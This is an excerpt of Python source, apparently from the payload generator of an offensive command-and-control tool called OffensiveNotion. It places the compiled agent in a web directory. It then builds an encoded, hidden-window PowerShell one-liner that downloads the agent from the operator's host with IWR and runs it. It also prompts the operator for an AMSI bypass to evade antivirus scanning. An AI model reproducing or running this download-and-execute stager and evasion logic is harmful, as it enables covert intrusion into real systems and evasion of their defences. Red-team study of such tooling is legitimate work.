...
DOWNLOAD_DIRECTORY = f"{getcwd()}/utils/www"
...
def copy_agent(os, build, uri):
    web_dir = f"/OffensiveNotion/utils/www/{uri}"
    print(f"{info}Copying agent")
    agent_name = "offensive_notion.exe" if os == "windows" else "offensive_notion"
    try:
        shutil.copyfile(f"/out/{agent_name}", web_dir)
...
def generate_payload(method, host, port, uri):
    print(f"{info}Generating payload")
    srv_host = host
    srv_port = port
    srv_uri = uri
    ...
    if method == "powershell":
        amsi_primitive = input(
            f"{important}Enter your favorite AMSI bypass. Leave blank for a default > "
        )
        if amsi_primitive == "":
        ...
        payload_primitive = f"IWR  http://{srv_host}:{srv_port}/{srv_uri} -Outfile {random_str}; Start-Process -FilePath .\{random_str} -Wait -NoNewWindow"
        ...
        one_liner = f"powershell.exe -nop -w hidden -ep bypass -e {str(decoded)}"
        ...
        one_liner = f"{cmd_primitive}'{payload_primitive}'"
